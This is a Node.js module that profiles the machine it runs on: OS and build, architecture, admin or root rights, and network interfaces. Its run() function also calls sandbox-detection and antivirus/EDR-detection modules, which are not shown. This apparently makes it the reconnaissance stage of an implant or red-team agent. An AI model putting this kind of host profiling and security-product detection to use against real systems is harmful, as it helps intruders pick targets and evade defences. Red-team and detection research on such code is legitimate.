const os = require('os');
const { execSync } = require('child_process');
const sandbox = require('./sandbox');
const avdetect = require('./avdetect');

function detectOS() {
  const info = {
    platform: os.platform(),
    type: os.type(),
    release: os.release(),
    hostname: os.hostname(),
    version: '',
    build: '',
    distro: '',
    kernel: '',
  };

  try {
    if (process.platform === 'win32') {
      const out = execSync('powershell -Command "(Get-WmiObject Win32_OperatingSystem).Version"', { encoding: 'utf8', timeout: 5000 });
      info.version = out.trim();
      const buildOut = execSync('powershell -Command "(Get-WmiObject Win32_OperatingSystem).BuildNumber"', { encoding: 'utf8', timeout: 5000 });
      info.build = buildOut.trim();
      const nameOut = execSync('powershell -Command "(Get-WmiObject Win32_OperatingSystem).Caption"', { encoding: 'utf8', timeout: 5000 });
      info.name = nameOut.trim();
    } else if (process.platform === 'linux') {
      try {
        const distro = execSync('cat /etc/os-release 2>/dev/null | grep -E "^PRETTY_NAME=" | cut -d= -f2 | tr -d \'"\'', { encoding: 'utf8', timeout: 5000 });
        info.distro = distro.trim();
      } catch (e) {
        info.distro = os.type();
      }
      try {
        const kernel = execSync('uname -r', { encoding: 'utf8', timeout: 5000 });
        info.kernel = kernel.trim();
      } catch (e) {
        info.kernel = os.release();
      }
    } else if (process.platform === 'darwin') {
      try {
        const ver = execSync('sw_vers -productVersion', { encoding: 'utf8', timeout: 5000 });
        info.version = ver.trim();
      } catch (e) {
        info.version = os.release();
      }
      try {
        const build = execSync('sw_vers -buildVersion', { encoding: 'utf8', timeout: 5000 });
        info.build = build.trim();
      } catch (e) {
        // skip
      }
    }
  } catch (e) {
    // skip
  }

  return info;
}

function detectArch() {
  const arch = os.arch();
  const mapping = {
    x64: 'x64',
    x32: 'x86',
    ia32: 'x86',
    arm: 'ARM',
    arm64: 'ARM64',
  };
  return mapping[arch] || arch;
}

function detectPrivileges() {
  const result = { isAdmin: false, isRoot: false, user: '' };
  try {
    result.user = os.userInfo().username;
    if (process.platform === 'win32') {
      try {
        execSync('net session 2>nul', { timeout: 3000 });
        result.isAdmin = true;
      } catch (e) {
        result.isAdmin = false;
      }
    } else {
      result.isRoot = process.getuid && process.getuid() === 0;
    }
  } catch (e) {
    // skip
  }
  return result;
}

function detectNetwork() {
  const info = {
    interfaces: [],
    type: 'Unknown',
    hostname: os.hostname(),
  };
  try {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
      for (const iface of nets[name]) {
        if (!iface.internal) {
          info.interfaces.push({
            name,
            address: iface.address,
            family: iface.family,
            mac: iface.mac,
          });
          if (iface.address.startsWith('10.') || iface.address.startsWith('172.') || iface.address.startsWith('192.168')) {
            info.type = 'NAT';
          } else if (iface.address.startsWith('169.254')) {
            info.type = 'APIPA';
          } else {
            info.type = 'Direct';
          }
        }
      }
    }
  } catch (e) {
    // skip
  }
  return info;
}

function run() {
  const osInfo = detectOS();
  const arch = detectArch();
  const privs = detectPrivileges();
  const net = detectNetwork();
  const sandboxResult = sandbox.analyze();
  const avDetected = avdetect.detect();
  const edrDetected = avdetect.detectEDR();
  const avWMI = avdetect.detectWMI();

  return {
    timestamp: new Date().toISOString(),
    os: osInfo,
    architecture: arch,
    privileges: privs,
    network: net,
    sandbox: sandboxResult,
    securityProducts: {
      antivirus: avDetected,
      edr: edrDetected,
      wmiDetected: avWMI,
    },
    environment: {
      hostname: os.hostname(),
      uptime: os.uptime(),
      cpus: os.cpus().length,
      totalMemory: Math.round(os.totalmem() / (1024 * 1024 * 1024) * 100) / 100 + ' GB',
      freeMemory: Math.round(os.freemem() / (1024 * 1024 * 1024) * 100) / 100 + ' GB',
      loadAvg: os.loadavg ? os.loadavg() : null,
    },
  };
}

module.exports = {
  detectOS,
  detectArch,
  detectPrivileges,
  detectNetwork,
  run,
};
